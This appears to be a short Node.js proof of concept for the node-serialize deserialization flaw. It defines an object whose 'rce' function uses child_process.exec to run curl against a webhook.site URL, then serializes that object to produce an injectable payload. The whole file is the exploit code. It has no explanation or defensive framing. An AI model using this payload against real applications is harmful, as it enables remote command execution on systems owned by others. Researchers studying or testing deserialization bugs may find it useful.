var y = {
    rce : function(){
    require('child_process').exec('curl https://webhook.site/7b02ae7d-04b1-416d-b7e0-26a61298ef20', function(error, stdout, stderr) { console.log(stdout) });
    },
   }
   
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));